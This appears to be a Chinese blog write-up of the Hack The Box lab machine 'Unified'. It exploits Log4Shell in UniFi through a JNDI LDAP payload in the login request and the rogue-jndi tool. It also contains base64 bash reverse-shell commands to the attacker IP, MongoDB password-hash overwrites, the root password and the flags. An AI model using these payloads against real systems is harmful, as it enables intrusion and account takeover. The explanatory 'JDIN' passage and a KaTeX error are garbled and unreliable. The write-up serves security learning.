---
title: HTB-Unified
description: 'Hack the box'
pubDate: 2024-03-03 
image: /public/hackthebox/Unified.png
categories:
  - Documentation
tags:
  - Hackthebox
  - Linux Machine
---

## TASK 1
![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709385741617-1ff74927-b9c7-422c-a357-ecae7a3c9004.png)

利用nmap扫描即可

## TASK 2
![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709386000972-28163e26-2b81-44a3-937e-73f4a29264f9.png)

查看8080网站标题即可

## TASK 3
![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709386103549-2ef74660-c40f-4d7e-aba2-533a4aac94ef.png)

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709386024581-32dc23e3-b8eb-4a08-8faf-61e4a5f3fc85.png)

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709386078782-cc845894-1e94-4da1-9273-110267a0e6f0.png)仔细观察登录窗口即可

## TASK 4
![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709386260785-28b1949a-b2c2-4367-9dc9-78dd9d060aad.png)

<font style="color:rgb(77, 77, 77);">这时候就要想到了既然给了一个cms框架，也知道具体版本，那么就可以去搜索一下这个版本的unifi有没有什么cve</font>  
<font style="color:rgb(77, 77, 77);">果然，通过Google得知unifi 6.4.54存在漏洞CVE-2021-44228，是一个log4j漏洞</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709386329869-692bbafd-46c7-40af-a240-f1ad86076118.png)

## TASK 5
![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709386519061-82319868-c135-4f14-bb76-f349b8c7bae6.png)

### 漏洞利用
[https://cloud.tencent.com/developer/article/1922132](https://cloud.tencent.com/developer/article/1922132)

### 漏洞复现
先测试一下是否有漏洞

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">使用burp或者开发者工具抓取登录时的数据包，同时使用tcpdump抓取攻击机tun0的389端口</font>

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">sudo tcpdump -i tun0 port 389</font>

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">编辑登录数据包，在data的remember字段中把flase改成"${jndi:ldap://10.10.16.20/whatever}"，重新发送数据包</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709439301798-4ad30ff8-5020-431d-b24d-8d5790d740a7.png)

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709439273904-86b49ff6-e886-4705-8e6b-bbdda44da8d6.png)

成功接收到数据

#### 环境搭建
<font style="color:rgb(77, 77, 77);">在进行漏洞利用前，要先配置好漏洞利用环境</font>  
<font style="color:rgb(77, 77, 77);">首先先安装jdk，之后再使用</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">sudo apt-get install maven</font><font style="color:rgb(77, 77, 77);">命令安装mvn</font>  
<font style="color:rgb(77, 77, 77);">安装mvn是用于编译rogue-jndi</font>

<font style="color:rgb(77, 77, 77);">什么是rogue-jndi？  
</font><font style="color:rgb(77, 77, 77);">rogue-jndi会开启一个本地的LDAP服务器，允许我们接收来自有漏洞的服务器的连接并执行恶意代码</font>

```plain
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```

这里踩坑了

maven需要换国内源

查教程搞了半天才搞好

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709462474140-50f0064d-9578-427a-9b8d-35dcfdbe704e.png)

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709462733737-3edad190-f734-496f-8451-8e0bdbc5830d.png)

这时我们成功拿到了RogueJndi的jar包

### 漏洞原理
<font style="color:rgb(77, 77, 77);">此 Log4J 漏洞可通过注入操作系统命令 (OS Command Injection) 来利用，这是一种 Web </font>[安全漏洞](https://so.csdn.net/so/search?q=%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E&spm=1001.2101.3001.7020)<font style="color:rgb(77, 77, 77);">，允许攻击者在运行应用程序的服务器上执行任意操作系统命令，通常会完全破坏应用程序并破坏其数据。</font>

<font style="color:rgb(77, 77, 77);">   
</font><font style="color:rgb(13, 13, 13);">JDIN（Java Distributed INterfaces）是一种用于创建分布式应用程序的Java框架。它提供了一组API和工具，用于在分布式环境中创建和管理对象。JDIN旨在简化分布式系统的开发，通过提供通信和远程对象访问的机制，使开发人员能够更轻松地构建分布式应用程序。</font>

<font style="color:rgb(13, 13, 13);"></font>

<font style="color:rgb(13, 13, 13);">LDAP（轻量目录访问协议）是一种用于访问和维护分布式目录信息的协议。它通常用于管理用户身份验证、访问控制和资源配置等信息。LDAP提供了一种层次结构的数据模型，类似于文件系统中的目录结构，其中包含了各种类型的数据条目。LDAP客户端可以通过LDAP协议与LDAP服务器进行通信，执行查询、添加、修改和删除条目等操作。</font>

<font style="color:rgb(13, 13, 13);"></font>

<font style="color:rgb(13, 13, 13);">在实际应用中，JDIN和LDAP可以一起使用，以构建具有分布式功能的应用程序并管理用户身份验证和访问控制。例如，可以使用JDIN来开发分布式系统的业务逻辑，并使用LDAP来存储和管理用户信息、权限和配置信息。通过将这两种技术结合使用，开发人员可以构建强大的分布式应用程序，同时实现灵活的身份验证和访问控制机制。</font>



JNDI注入：

动态协议转换：JNDI提前有配置初始化环境，设置了属性，但是当lookup()里传进来的参数协议与初始化的Context里配置的协议不一致时，就会动态的进行转换来查找传进去的参数，并且不会报错，所以当参数可控时，攻击者可以通过提供一个恶意的url地址来控制受害者加载攻击者指定的恶意类。



ctx.lookup("rmi://your-server/refObj");// 初始化的

ctx.lookup("ldap://your-server/cn=bar,dc=test,dc=org");//实际上传进来的

**<font style="color:rgb(77, 77, 77);">命名引用</font>**<font style="color:rgb(77, 77, 77);">：Java为了将Object对象存储在Naming（命名）或Directory（目录）服务下，提供了Naming Reference（命名引用）功能，对象可以通过绑定Reference类存储在Naming或Directory服务下，比如RMI、LDAP等。</font>

<font style="color:rgb(77, 77, 77);">有点超链接的感觉</font>

<font style="color:rgb(77, 77, 77);">总结：</font>

<font style="color:rgb(77, 77, 77);">在LDAP中可以存储外部的资源，叫做命名引用，对应Reference类。比如远程HTTP服务的一个.class文件</font>

<font style="color:rgb(77, 77, 77);">如果JNDI客户端基于LDAP服务，找不到相应的资源，就会去LDAP中默认指定的地址请求（初始化配置的），如果是命名引用，会将这个文件下载到本地。</font>

<font style="color:rgb(77, 77, 77);">如果下载的.class文件包含无参构造函数或静态代码块，加载的时候会自动执行。因为下载之后会进行自动实例化。</font>

在使用Reference时，我们可以直接将对象传入构造方法中，当被调用时，对象的方法就会被触发，创建Reference实例时几个比较关键的属性：

**className：**远程加载时所使用的类名；

**classFactory：**加载的class中需要实例化类的名称；

**classFactoryLocation：**远程加载类的地址，提供class数据的地址可以是file/ftp/http等协议；

**Log4j2 rce原理**

首先log4j打印日志有四个级别：debug、info、warn、error，不管哪个方法打印日志，在正常的log处理过程中，对KaTeX parse error: Expected '}', got 'EOF' at end of input: …。 一旦在log字符串中检测到{}，就会解析其中的字符串尝试使用lookup查询，因此只要能控制log参数内容，就有机会实现漏洞利用。

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709471523458-742a480c-54e2-48ec-813c-163adf02604c.png)

修复思路

1、禁止用户请求参数中出现攻击关键字

2、禁止lookup下载远程文件（命名引用）

3、禁止log4j的应用连接外网

4、禁止log4j使用lookup

2.15版本修复方法：

修复后log4j2在jndi lookup中增加了很多限制：

默认不再支持二次跳转（命名引用）的方式获取对象

只有在log4j2.allowedLdapClasses列表中指定的class才能获取

只有远程地址是本地或者在log4j2.allowedLdapHosts列表中指定的地址才能获取

综上所述我们可以知道**<font style="color:rgb(255, 255, 255);background-color:rgb(20, 29, 43);">JNDI 在注入中利用 LDAP协议</font>**

## TASK 6
![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709471636365-53939548-dbbd-4920-9c50-feb697fd2632.png)

<font style="color:rgb(77, 77, 77);">Tcpdump</font>

刚刚示范的那样<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">tcpdump抓取攻击机tun0的389端口</font>

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">sudo tcpdump -i tun0 port 389</font>

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">编辑登录数据包，在data的remember字段中把flase改成"${jndi:ldap://10.10.16.20/whatever}"</font>

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">接收到数据</font>

> <font style="color:rgb(13, 13, 13);">TCPDump 是一个功能强大的网络抓包工具，它可以截取网络数据包并将其显示或保存为文件。它在网络诊断和分析中非常有用，可以帮助网络管理员和安全专家了解网络流量，排查问题，分析网络性能，以及进行安全审计等。</font>
>

## TASK 7
![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709471842526-b55bf93f-8c9b-4619-af98-75d4011c2744.png)

389端口

## TASK 8
![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709471882650-2a8eb411-4c89-47ac-b36a-eb4878c52839.png)

看到这道题基本清楚要开始漏洞复现了

### 漏洞复现
<font style="color:rgb(77, 77, 77);">现在我们可以构造payload以传递给 RogueJndi-1-1.jar Java 应用程序。</font>

<font style="color:rgb(77, 77, 77);">要使用 Rogue-JNDI 服务器，我们必须构造并传递一个payload，该payload将负责在目标系统上为我们提供一个 shell。对payload进行 Base64 编码，以防止出现任何编码问题。</font>

<font style="color:rgb(77, 77, 77);">echo 'bash -c bash -i >&/dev/tcp/your_tun0_ip/port 0>&1' | base64</font>

<font style="color:rgb(77, 77, 77);">打印出一串base64编码的字符</font>

<font style="color:rgb(77, 77, 77);">YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjAvNDQzIDA+JjEK</font>

<font style="color:rgb(35, 38, 59);">接下来使用RogueJndi-1.1.jar并监听4444端口</font>

> java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,<font style="color:rgb(77, 77, 77);">YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjAvNDQzIDA+JjEK</font>}|{base64,-d}|{bash,-i}" --hostname "10.10.16.20"![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709472646304-23e35140-0110-4834-984c-86fb02d9b86e.png)
>

利用tomcat传参

ldap://10.10.16.20:1389/o=tomcat

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">"${jndi:ldap://10.10.16.20:1389/o=tomcat/whatever}"</font>

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">按理来讲应该getshell了呀，为什么不弹呢，重新来一次吧</font>

<font style="color:rgb(77, 77, 77);">echo 'bash -c bash -i >&/dev/tcp/10.10.16.20/4433 0>&1' | base64</font>

<font style="color:rgb(77, 77, 77);">YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjAvNDQzMyAwPiYxCg==</font>

<font style="color:rgb(77, 77, 77);">java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjAvNDQzMyAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.16.20"</font>

ldap://10.10.16.20:1389/o=tomcat

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">"${jndi:ldap://10.10.16.20:1389/o=tomcat/whatever}"</font>

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">还是不弹，见鬼了</font>

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">再来！！</font>

<font style="color:rgb(77, 77, 77);">echo 'bash -c bash -i >&/dev/tcp/10.10.16.20/4444 0>&1' | base64</font>

<font style="color:rgb(77, 77, 77);">YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjAvNDQ0NCAwPiYxCg==</font>

<font style="color:rgb(77, 77, 77);">java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjAvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.16.20"</font>

<font style="color:rgb(77, 77, 77);">呜呜终于弹了</font>

<font style="color:rgb(77, 77, 77);">原来是多打了个whatever导致的</font>

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">"${jndi:ldap://10.10.16.20:1389/o=tomcat}"</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709475678356-34718533-13a7-4673-a73c-630af2660111.png)

由于不是交互式shell看着难受咱们可以改一下

<font style="color:rgb(25, 27, 31);background-color:rgb(248, 248, 250);">SHELL=/bin/bash script -q /dev/null</font><font style="color:rgb(25, 27, 31);"> : </font>

<font style="color:rgb(35, 38, 59);">使用</font>**<font style="color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);">ps aux</font>**<font style="color:rgb(35, 38, 59);">查看系统有哪些进程，发现27117端口存在mongodb数据库</font>

> + **a**<font style="color:rgb(13, 13, 13);">：表示显示所有用户的进程，而不仅仅是当前用户的进程。</font>
> + **u**<font style="color:rgb(13, 13, 13);">：表示以用户为主要输出格式，并显示与进程相关的详细信息，如用户、进程ID（PID）、CPU使用率、内存使用情况、启动时间、进程状态等。</font>
> + **x**<font style="color:rgb(13, 13, 13);">：表示显示不与终端关联的进程。通常情况下，</font>**ps**<font style="color:rgb(13, 13, 13);"> 命令只会显示与当前终端相关的进程，而使用 </font>**x**<font style="color:rgb(13, 13, 13);"> 选项可以显示所有进程，包括那些不与终端关联的后台进程。</font>
>

**<font style="color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);"></font>**

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709475879992-64a3cff5-3f90-4e4a-beb3-082ba83b40f8.png)

由于看的界面非常小，所以我们将这个输出到文档里，之后cat进行查看

ps aux > process_list.txt

cat process_list.txt

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709476161834-8326b9e0-51d4-46d7-9469-889625eef75f.png)

可以看见端口在27117开放

## TASK 9
![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709476459096-ce64d696-c896-4c70-b41a-7e18499cf34a.png)

mongodb --port 2717

<font style="color:rgb(35, 38, 59);">直接本地进行连接数据库</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709476485301-b578376c-f9b3-4303-9188-88955f13dd17.png)show dbs一下

发现默认数据库名字为ace

## TASK 10
![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709476515929-3bf93e9a-e12c-4d72-9316-d887864d6275.png)

<font style="color:rgb(77, 77, 77);">db.admin.find()</font>

## <font style="color:rgb(77, 77, 77);">TASK 11</font>
![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709476573430-c2859a32-0ad0-44f6-a69c-06716c738329.png)

<font style="color:rgb(68, 68, 68);">db.admin.update()</font>

## <font style="color:rgb(68, 68, 68);">TASK 12</font>
![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709476640662-16b903a9-fce5-410f-83df-5f59f74b4c30.png)

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709476851827-a4ae1a91-cb35-4735-aeed-43e28079c2b2.png)

发现admin的账号以及密码

<font style="color:rgb(35, 38, 59);">发现存在administrator，但是由于密码是进过sha512加密后的结果，我们并不能直接得到密码</font>  
<font style="color:rgb(35, 38, 59);">同时由于加密强度很高，我们只能通过hash碰撞破解密码，但是成功率也很低</font>  
<font style="color:rgb(35, 38, 59);">这时想到可以把administrator的密码修改成弱密码如password</font>  
<font style="color:rgb(35, 38, 59);">先使用</font>**<font style="color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);">mkpasswd -m sha-512 password</font>**<font style="color:rgb(35, 38, 59);">命令，得到password的sha512加密后的值</font>

<font style="color:rgb(35, 38, 59);">$6$H/9uby/SS.lqTZt1$AxcFwPi8z5MpDd1D7Efv/xrEiPE2TZxKHKqOVk//b/salsNhZfwY2jtKfUQPdsJU8RXCl7iP9NzPD6YDnGeae0</font>

<font style="color:rgb(35, 38, 59);">db.admin.insert({</font>

<font style="color:rgb(35, 38, 59);">  "email": "pilgrim@localhost.local",</font>

<font style="color:rgb(35, 38, 59);">  "last_site_name": "default",</font>

<font style="color:rgb(35, 38, 59);">  "name": "unifiadmin",</font>

<font style="color:rgb(35, 38, 59);">  "time_created": NumberLong(100019800), </font>

<font style="color:rgb(35, 38, 59);">  "x_shadow": "$6$H/9uby/SS.lqTZt1$AxcFwPi8z5MpDd1D7Efv/xrEiPE2TZxKHKqOVk//b/salsNhZfwY2jtKfUQPdsJU8RXCl7iP9NzPD6YDnGeae0"</font>

<font style="color:rgb(35, 38, 59);">})</font>

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);"></font>

<font style="color:rgb(35, 38, 59);"></font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709476947049-bcdc95e4-60f0-46c3-820f-7c8edb50ef6d.png)

<font style="color:rgb(35, 38, 59);">执行成功后寻找刚刚添加的用户</font>

<font style="color:rgb(35, 38, 59);">db.admin.find().forEach(printjson);</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709477197864-642462f8-4b80-42c8-9cbe-92136785da06.png)

id 65e48cdb4a29d756feab4d2a

**<font style="color:rgb(77, 77, 77);">查看一下网站的用户的详细信息</font>**  
<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">db.site.find().forEach(printjson);</font>

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">这里由于不回显导致无法进行下一步（按理来说应该回显的）</font>

**<font style="color:rgb(77, 77, 77);">将我们插入的用户绑定到这个网站上去，其中的admin_id就是自己添加的用户的id，site_id就是上面获取的id</font>**

**<font style="color:rgb(77, 77, 77);">db.privilege.insert({"admin_id":"xxxx","permisions":[],"role":"admin","site_id":"xxxx"});</font>**

<font style="color:rgb(77, 77, 77);">接着去后台登录的页面登录刚才的账号，密码是自己设置的密码。</font>

<font style="color:rgb(77, 77, 77);">在setting中能知道root的密码如下：  
</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">NotACrackablePassword4U2022</font><font style="color:rgb(77, 77, 77);">然后ssh登录就行了</font>

<font style="color:rgb(77, 77, 77);"></font>

<font style="color:rgb(77, 77, 77);">这里由于无法回显咱们换一个方法</font>

<font style="color:rgb(35, 38, 59);">先使用</font>**<font style="color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);">mkpasswd -m sha-512 password</font>**<font style="color:rgb(35, 38, 59);">命令，得到password的sha512加密后的值</font>

<font style="color:rgb(35, 38, 59);">$6$6LGfhVdE.SrlGbsq$j///PNBrdvqlNnL35Lqoowj51HgTmEiw1vKfCZDUq9BoGq9Dk3E4pIXufMWz6cmRQV6lYctTpYQwAe15PWYN3/</font>

<font style="color:rgb(35, 38, 59);">将administrator的密码修改为password</font>

<font style="color:rgb(68, 68, 68);background-color:rgb(245, 245, 250);">mongo --port </font><font style="color:rgb(136, 0, 0);background-color:rgb(245, 245, 250);">27117</font><font style="color:rgb(68, 68, 68);background-color:rgb(245, 245, 250);"> ace --eval </font><font style="color:rgb(0, 176, 232);background-color:rgb(245, 245, 250);">'db</font><font style="color:rgb(68, 68, 68);background-color:rgb(245, 245, 250);">.admin.</font><font style="color:rgb(163, 21, 21);background-color:rgb(245, 245, 250);">update</font><font style="color:rgb(68, 68, 68);background-color:rgb(245, 245, 250);">({</font><font style="color:rgb(163, 21, 21);background-color:rgb(245, 245, 250);">"_id"</font><font style="color:rgb(68, 68, 68);background-color:rgb(245, 245, 250);">:</font><font style="color:rgb(163, 21, 21);background-color:rgb(245, 245, 250);">ObjectId</font><font style="color:rgb(68, 68, 68);background-color:rgb(245, 245, 250);">(</font><font style="color:rgb(163, 21, 21);background-color:rgb(245, 245, 250);">"61ce278f46e0fb0012d47ee4"</font><font style="color:rgb(68, 68, 68);background-color:rgb(245, 245, 250);">)},{$set：{</font><font style="color:rgb(163, 21, 21);background-color:rgb(245, 245, 250);">"x_shadow"</font><font style="color:rgb(68, 68, 68);background-color:rgb(245, 245, 250);">:</font><font style="color:rgb(163, 21, 21);background-color:rgb(245, 245, 250);">"$</font><font style="color:rgb(35, 38, 59);">$6$6LGfhVdE.SrlGbsq$j///PNBrdvqlNnL35Lqoowj51HgTmEiw1vKfCZDUq9BoGq9Dk3E4pIXufMWz6cmRQV6lYctTpYQwAe15PWYN3/</font><font style="color:rgb(163, 21, 21);background-color:rgb(245, 245, 250);">"</font><font style="color:rgb(68, 68, 68);background-color:rgb(245, 245, 250);">}})'</font>

<font style="color:rgb(35, 38, 59);">再使用修改后的密码登录网站，登录成功</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709477589112-46bfd575-bda9-4769-8b5c-4973ad67e435.png)

<font style="color:rgb(35, 38, 59);">后台设置里看到ssh密码</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709477596604-2a74eeef-31a9-47b7-9843-7721852170f7.png)

<font style="color:rgb(68, 68, 68);">NotACrackablePassword4U2022</font>

<font style="color:rgb(35, 38, 59);">ssh远程连接后以为root用户，提权成功</font>

<font style="color:rgb(35, 38, 59);">ssh root@10.129.45.240</font>

<font style="color:rgb(35, 38, 59);">user.txt</font>

6ced1a6a89e666c0620cdb10262ba127

<font style="color:rgb(35, 38, 59);">root.txt</font>

<font style="color:rgb(35, 38, 59);">e50bc93c75b634e4b272d2f771c33681</font>

